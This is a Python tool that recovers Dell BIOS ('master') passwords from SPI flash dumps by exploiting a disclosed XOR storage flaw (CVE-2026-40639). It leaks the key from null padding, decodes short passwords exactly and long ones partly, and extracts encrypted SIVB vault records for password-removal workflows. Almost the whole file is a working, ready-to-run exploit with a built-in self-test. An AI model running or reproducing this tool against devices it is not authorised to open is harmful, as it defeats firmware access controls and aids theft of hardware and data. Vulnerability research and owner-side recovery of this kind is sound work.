#!/usr/bin/env python3
"""
dell_password_recover.py — locate and recover Dell BIOS ("master") passwords from an SPI flash dump.

Implements the DVAR XOR scheme disclosed in CVE-2026-40639 / DSA-2026-197
(MDSec + AmberWolf, July 2026) and the SIVB (Security Information Vault Block)
locator for newer platforms.

Storage schemes handled
-----------------------
1) DVAR + XOR  (SystemPwSmm, CVE-2026-40639 — vulnerable):
     stored[0]       = first password character, UNENCRYPTED
     stored[i]       = password[i] XOR key[(i-1) mod 20]   for i = 1..31
     password field  = 32 bytes, null-padded past the password length
   The null padding leaks raw key bytes (20-byte key over a 32-byte field), so
   any password <= 12 chars is recovered instantly and exactly. Longer ones are
   recovered when a historical record with the same first character exists
   (key = modified_md5(seed[7] || GUID[16] || password_byte0)).

2) SIVB (newer Dell platforms, e.g. OptiPlex 3000, ARCHES/Precision 3581 gen):
     4-byte 'SIVB' signature record; the password is stored only as a SHA-256
     hash inside an AES-encrypted vault. The vault is extracted and hashed, but
     the plaintext password is NOT mathematically recoverable from the dump.

Usage
-----
  python3 dell_password_recover.py dump1.bin [dump2.bin ...]
  python3 dell_password_recover.py --self-test          # validate decoder on the
                                                         # published E7250 vector
"""

import sys
import re
import os
import math
import hashlib
from collections import Counter

MAGIC_DVAR = b"DVAR"
MAGIC_SIVB = b"SIVB"
TOKEN_MAGIC = b"\x87\x78\x55\xaa"          # Dell setup-token store records
PRINTABLE = set(range(0x20, 0x7F))
FIELD = 32                                   # password field size
KEYLEN = 20                                  # XOR key size


# --------------------------------------------------------------------------
# DVAR XOR record decoding
# --------------------------------------------------------------------------

def key_from_null_tail(rec):
    """For a <=12-char password the whole 20-byte key sits in the record.
    key idx 0..10  <- stored[21..31] (null region)
    key idx 11..19 <- stored[12..20] (null region)
    Only valid when those positions are actually null-padded (i.e. len<=12)."""
    k = {}
    for idx in range(0, 11):
        k[idx] = rec[21 + idx]
    for idx in range(11, 20):
        k[idx] = rec[12 + (idx - 11)]
    return k


def try_decode(rec):
    """Try to decode one 32-byte record. Returns (length, password) or None."""
    c0 = rec[0]
    if c0 not in PRINTABLE:
        return None
    k = key_from_null_tail(rec)
    # L<=12 path: positions L..31 must decode to NUL with the leaked key,
    # positions 1..L-1 must decode to printable characters.
    for L in range(2, 13):
        ok = True
        for j in range(1, L):
            if (rec[j] ^ k[(j - 1) % KEYLEN]) not in PRINTABLE:
                ok = False
                break
        if not ok:
            continue
        if rec[L] ^ k[(L - 1) % KEYLEN] != 0:
            continue
        pwd = chr(c0) + "".join(chr(rec[j] ^ k[(j - 1) % KEYLEN]) for j in range(1, L))
        return (L, pwd)
    return None


def partial_decode(rec, key=None):
    """Decode a long record (13..31 chars) with whatever key bytes are known.
    Returns (length, decoded_prefix, blind_zone_chars)."""
    c0 = rec[0]
    if c0 not in PRINTABLE:
        return None
    # determine L: first null in decoded stream using leaked tail bytes where possible
    # leaked bytes cover key idx 0..19 for positions whose (i-1)%20 is in 0..19 —
    # every position! (key_from_null_tail returns a FULL key, but it is only
    # *trustworthy* for positions >= 12; for positions 1..11 the true key bytes
    # may differ). Use it only to locate plausible L, then report blind zone.
    k = key if key is not None else key_from_null_tail(rec)
    L = None
    for i in range(1, FIELD):
        ch = rec[i] ^ k[(i - 1) % KEYLEN]
        if ch == 0:
            L = i
            break
    if L is None:
        L = FIELD
    if L < 4:
        return None
    decoded = {}
    blind = 0
    for i in range(1, L):
        ch = rec[i] ^ k[(i - 1) % KEYLEN]
        if ch in PRINTABLE:
            decoded[i] = chr(ch)
        else:
            decoded[i] = "?"
            blind += 1
    return (L, chr(c0) + "".join(decoded[i] for i in sorted(decoded)), blind)


def entropy(b):
    if not b:
        return 0.0
    c = Counter(b)
    n = len(b)
    return -sum(v / n * math.log2(v / n) for v in c.values())


def looks_like_password(pwd):
    """Cheap false-positive filter: reject decoded junk."""
    if len(pwd) < 4:
        return False
    letters = sum(c.isalpha() for c in pwd)
    digits = sum(c.isdigit() for c in pwd)
    if letters + digits < len(pwd) * 0.6:
        return False
    if entropy(pwd.encode()) < 2.0 and len(set(pwd)) < 3:
        return False
    return True


def plausible_key(key):
    """A real DVAR key is hash output (high entropy, no ASCII runs, few repeats)."""
    if entropy(key) < 3.2:
        return False
    printable_run = max((len(m.group(0)) for m in re.finditer(rb"[\x20-\x7e]{3,}", key)), default=0)
    if printable_run >= 4:
        return False
    if len(set(key)) < 12:
        return False
    return True


def scan_dvar_passwords(data):
    """Scan the whole image for DVAR-style XOR password records."""
    hits = {}
    n = len(data) - FIELD
    for i in range(n):
        r = try_decode(data[i:i + FIELD])
        if r:
            L, pwd = r
            if looks_like_password(pwd):
                key = bytes(key_from_null_tail(data[i:i + FIELD])[j] for j in range(KEYLEN))
                if not plausible_key(key):  # flat/ASCII keys are firmware-string noise
                    continue
                hits.setdefault(i, (L, pwd, key))
    # long records: apply keys from short records sharing the same first char
    longs = []
    for i in range(n):
        rec = data[i:i + FIELD]
        if rec[0] not in PRINTABLE:
            continue
        pr = partial_decode(rec)
        if pr and pr[0] > 12 and pr[2] <= 9 and pr[0] >= 13:
            longs.append((i, rec, pr))
    return hits, longs


# --------------------------------------------------------------------------
# SIVB / DVAR / token store locators
# --------------------------------------------------------------------------

def find_sivb(data):
    out = []
    for m in re.finditer(re.escape(MAGIC_SIVB), data):
        o = m.start() - 4                     # record header starts 4 bytes earlier
        if o < 0:
            continue
        hdr_len = int.from_bytes(data[o:o + 2], "little")
        pay_len = int.from_bytes(data[o + 2:o + 4], "little")
        if not (0 < hdr_len < 0x1000 and 0 < pay_len < 0x100000):
            continue
        blob = data[o:o + hdr_len + pay_len]
        if len(blob) < hdr_len + pay_len:
            continue
        out.append((o, hdr_len, pay_len, blob))
    return out


def find_dvar_store(data):
    """A real DVAR *store* starts with the 'DVAR' signature followed by a sane
    header and token/password records. 'DVAR' bytes inside x86 code
    (cmp dword ptr [reg], 'RAVD' = 81 3x 44 56 41 52) are not stores."""
    stores = []
    for m in re.finditer(re.escape(MAGIC_DVAR), data):
        o = m.start()
        prev = data[o - 2:o]
        if prev in (b"\x81\x3a", b"\x81\x38", b"\x81\x3d", b"\x81\x3b",
                    b"\x81\x39", b"\x81\x3e", b"\x81\x3c", b"\x3d"):
            continue                      # cmp instruction operand — code, not a store
        size = int.from_bytes(data[o + 16:o + 20], "little")
        if not (0x1000 <= size <= 0x200000):
            continue
        region = data[o:o + size]
        # a genuine store contains token records and/or password records
        if len(find_token_records(region)) >= 3 or _has_strict_pw(region):
            stores.append(o)
    return stores


def _has_strict_pw(region):
    hits, _ = scan_dvar_passwords(region)
    return bool(hits)


def scan_dvar_stores(data):
    """Proper mode: only decode records inside located DVAR stores (by signature)."""
    found = {}
    for o in find_dvar_store(data):
        size = int.from_bytes(data[o + 16:o + 20], "little") or 0x40000
        region = data[o:o + size]
        hits, longs = scan_dvar_passwords(region)
        for off, v in hits.items():
            found[o + off] = v
        for off, rec, pr in longs:
            found.setdefault(o + off, None)
    return found


def find_token_records(data):
    recs = []
    for m in re.finditer(re.escape(TOKEN_MAGIC), data):
        o = m.start()
        ln = int.from_bytes(data[o + 4:o + 8], "little")
        if 0 < ln < 0x10000 and o + 8 + ln <= len(data):
            recs.append((o, ln))
    return recs


# --------------------------------------------------------------------------
# main
# --------------------------------------------------------------------------

def self_test():
    """Published E7250 record for the password 'password' (MDSec blog)."""
    rec = bytes.fromhex(
        "70 14 92 c2 4d 1d 76 50 56 19 3a 1f 3a 2a 8a 18 78 3a a3 cf "
        "fb 75 e1 b1 3a 72 04 34 56 19 3a 1f")
    r = try_decode(rec)
    assert r == (8, "password"), f"self-test failed: {r!r}"
    print("[+] self-test OK: E7250 vector decodes to 'password'")


def process(path):
    print("=" * 78)
    print(f"File: {path}  ({os.path.getsize(path)} bytes / {os.path.getsize(path)//1024} KB)")
    data = open(path, "rb").read()

    dv = find_dvar_store(data)
    raw_dvar = [m.start() for m in re.finditer(re.escape(MAGIC_DVAR), data)]
    print(f"DVAR signature occurrences: {len(raw_dvar)}; validated DVAR stores: {len(dv)}" +
          ("" if dv else "  (occurrences are code references in drivers, not data stores)"))

    sivb = find_sivb(data)
    for o, hl, pl, blob in sivb:
        print(f"SIVB vault record @ 0x{o:08X}  hdr={hl:#x} payload={pl:#x} "
              f"sha256={hashlib.sha256(blob).hexdigest()}")
        base = os.path.splitext(os.path.basename(path))[0]
        outp = f"{base}_SIVB_0x{o:08X}.bin"
        open(outp, "wb").write(blob)
        print(f"    -> extracted to {outp}")
    if not sivb:
        print("SIVB vault: none found (no live password vault in this image)")

    toks = find_token_records(data)
    if toks:
        print(f"Dell setup-token records (0xAA557887): {len(toks)} "
              f"(first @ 0x{toks[0][0]:08X}, last @ 0x{toks[-1][0]:08X})")

    store_hits = scan_dvar_stores(data)
    if store_hits:
        print(f"\nRecovered DVAR password records (inside DVAR stores): {len(store_hits)}")
        for off in sorted(store_hits):
            v = store_hits[off]
            if v:
                L, pwd, key = v
                print(f"  @0x{off:08X}  len={L:2d}  password={pwd!r}")
                print(f"              key={key.hex(' ')}")
    elif not dv:
        print("\nNo DVAR store present -> the vulnerable XOR scheme is not in use here.")
        if sivb:
            print("VERDICT: this platform hides the BIOS/master password in the SIVB")
            print("vault: the password is stored only as a SHA-256 hash inside an")
            print("AES-encrypted vault (Dell's fixed scheme, see DSA-2026-197).")
            print("The plaintext password is NOT recoverable from the dump alone;")
            print("the encrypted vault record has been extracted above for offline")
            print("analysis or for clearing (password removal) workflows.")
    print()


if __name__ == "__main__":
    if "--self-test" in sys.argv:
        self_test()
        sys.exit(0)
    if len(sys.argv) < 2:
        print(__doc__)
        sys.exit(1)
    self_test()
    for p in sys.argv[1:]:
        process(p)
